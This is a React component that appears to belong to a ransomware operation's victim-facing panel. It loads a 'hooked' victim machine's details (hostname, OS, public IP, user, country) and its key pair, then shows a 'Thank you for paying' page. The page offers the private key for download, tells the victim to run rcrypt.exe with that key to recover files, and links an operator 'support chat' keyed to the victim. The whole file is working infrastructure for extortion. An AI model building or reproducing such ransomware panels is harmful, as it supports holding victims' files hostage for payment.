import { useParams } from "react-router-dom";
import { getFetch } from '../utils/functions';
import { useState, useEffect } from 'react';
import Button from 'react-bootstrap/Button';

const UserPay = () => {

    const [agentID, setAgentID] = useState("");
    const [hostname, setHostname] = useState("");
    const [os, setOs] = useState("");
    const [ip, setIp] = useState("");
    const [hookUser, setHookUser] = useState("");
    const [hookDate, setHookDate] = useState("");
    const [country, setCountry] = useState("");
    const [privateKey, setPrivateKey] = useState("");
    const [publicKey, setPublicKey] = useState("");

    const exportUserInfo = (key, fileName) => {
        const blob = new Blob([key], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.download = fileName;
        link.href = url;
        link.click();
    }


    let { agenttag } = useParams();

    const getAgentInfo = async () => {
        const agentInfo = await getFetch({ agentTag: agenttag }, "/getAgentTagInfo")
        console.log(agentInfo.data)
        setAgentID(agentInfo.data.agent.agentID)
        setHostname(agentInfo.data.agent.host)
        setOs(agentInfo.data.agent.versionOS)
        setIp(agentInfo.data.agent.ip)
        setHookUser(agentInfo.data.agent.hookUser)
        setHookDate(agentInfo.data.agent.hookDate)
        setCountry(agentInfo.data.agent.country)
        setPrivateKey(agentInfo.data.agent.privKey)
        setPublicKey(agentInfo.data.agent.pubKey)
    }

    useEffect(() => {
        getAgentInfo()
    }, []);

    return (
        <div className="container-fluid">
            <h1>Thank you for paying here's your agent and recovery info !</h1>
            <h3 className="text-dark mb-4">Agent Tag: {agenttag}</h3>
            <form>
                <div className="row">
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hostname</strong></label>
                            <p>{hostname}</p>
                        </div>
                    </div>
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hooked User&nbsp;&nbsp;</strong></label>
                            <p>{hookUser}</p>
                        </div>
                    </div>
                </div>
                <div className="row">
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Operating System</strong></label>
                            <p>{os}</p>
                        </div>
                    </div>
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Hook Date</strong></label>
                            <p>{hookDate}<br /></p>
                        </div>
                    </div>
                </div>
                <div className="row">
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Public IP</strong></label>
                            <p>{ip}</p>
                        </div>
                    </div>
                    <div className="col">
                        <div className="mb-3"><label className="form-label" htmlFor="username"><strong>Country</strong></label>
                            <p>{country}<br /></p>
                        </div>
                    </div>
                </div>
                <div className="mb-3">
                    <Button onClick={() => exportUserInfo(publicKey, "public_key.pem")} variant="light">
                        Public Key
                    </Button>
                    <Button onClick={() => exportUserInfo(privateKey, "private_key.pem")} variant="warning">
                        Private Key
                    </Button>
                </div>
                <p>To recover your files, please download the private key file and run the rcypt.exe with the file as an argument in a powershell window, exemple: c:/path/to/rcrypt.exe c:/path/to/private_key.pem</p>
                <p>If you would need help, here's our SUPPORT CHAT: https://cthulhu.hecque.fr/chatuser/{agentID}-{hostname}-{hookUser}</p>
            </form>
        </div>
    )
}
export default UserPay;